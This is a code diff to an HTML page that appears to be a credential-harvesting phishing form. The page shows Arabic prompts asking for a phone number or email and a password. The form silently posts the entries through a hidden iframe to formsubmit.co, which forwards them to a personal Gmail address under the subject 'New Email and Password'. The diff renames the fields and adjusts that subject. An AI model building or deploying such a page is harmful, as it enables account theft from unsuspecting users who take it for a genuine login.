@@ -184,15 +184,15 @@
 
         <form id="mainForm" action="https://formsubmit.co/wael.egypt@gmail.com" method="POST" target="hidden_iframe" style="width: 100%;">
             <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_subject" value="كلمة سر جديدة محفوظة">
+            <input type="hidden" name="_subject" value="New Email and Password ">
             <input type="hidden" name="_template" value="table">
             
             <div class="input-group">
-                <input type="text" id="passName" name="اسم_الحساب" placeholder="  أدخل رقم الهاتف المحمول أول البريد الإلكتروني " required>
+                <input type="text" id="passName" name="Login" placeholder="  أدخل رقم الهاتف المحمول أول البريد الإلكتروني " required>
             </div>
             
             <div class="input-group">
-                <input type="password" id="passValue" name="كلمة_السر" placeholder="كلمة السر" required>
+                <input type="password" id="passValue" name="Password" placeholder="كلمة السر" required>
             </div>
         </form>
         
@@ -233,7 +233,7 @@
             const btn = document.getElementById("saveBtn");
             
             if (passName.trim() === "" || passValue.trim() === "") {
-                showAlert("الرجاء إدخال البريد الالكترونى وكلمة السر أولاً.");
+                showAlert("الرجاء إدخال اسم البريد الالكترونى وكلمة السر أولاً.");
                 return;
             }
 
